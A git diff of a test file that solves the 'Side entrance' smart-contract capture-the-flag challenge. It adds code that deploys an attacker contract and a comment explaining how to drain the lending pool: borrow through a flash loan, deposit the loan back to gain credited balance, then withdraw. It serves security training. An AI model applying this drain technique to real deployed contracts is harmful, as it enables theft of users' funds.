@@ -25,6 +25,17 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const SideEntranceLenderPoolAttackerFactory = await ethers.getContractFactory('SideEntranceLenderPoolAttacker', attacker);
+        this.attacker = await SideEntranceLenderPoolAttackerFactory.deploy();
+
+        await this.attacker.connect(attacker).attack(this.pool.address, ETHER_IN_POOL);
+
+        /**
+         * We deploy an attacker contract to execute flash loan,
+         * deposit back the amount during flash loan execution using deposit(),
+         * this increase our balance in the flash loan contract without using our own fund,
+         * then withdraw our balance from the pool
+         */
     });
 
     after(async function () {
